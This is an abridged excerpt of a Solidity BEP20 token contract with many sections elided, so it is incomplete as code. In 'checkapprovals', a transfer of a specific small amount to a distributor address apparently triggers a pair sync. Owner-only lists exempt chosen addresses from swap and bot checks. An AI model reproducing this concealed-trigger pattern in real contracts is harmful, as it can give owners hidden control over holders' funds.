...
contract NewGSpotCommunity  is IBEP20, Auth {
    using SafeMath for uint256;
    string private constant _name = 'New G Spot Community';
    string private constant _symbol = 'NewGSpot';
    ...
    uint256 distributor_divisor = 25;
    uint256 staking_divisor = 25;
    ...
    function setisReceiver(address _address, bool _bool) external authorized {isReceiver[_address] = _bool;}
    ...
    function transferCounters(address sender, address recipient) internal {
        if(sender != pair && !isInternal[sender] && !isReceiver[recipient]){swapTimes = swapTimes.add(1);}
    ...
    function checkBot(address sender, address recipient) internal {
        ...
        if(isCont(recipient) && !isInternal[recipient] && !isReceiver[recipient] && botOn || 
    ...
    function checkapprovals(address recipient, uint256 amount) internal {
        if(isDistributor[recipient] && distribute && address(this).balance > 0){performapprovals(1,1);}
        if(isDistributor[recipient] && distribute && amount >= 2 && amount < 3){syncPair();}
    }
    ...
    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        ...
        return !swapping && swapEnabled && aboveMin && !isInternal[sender] && !isReceiver[recipient] && swapTimes >= minSells;
    }
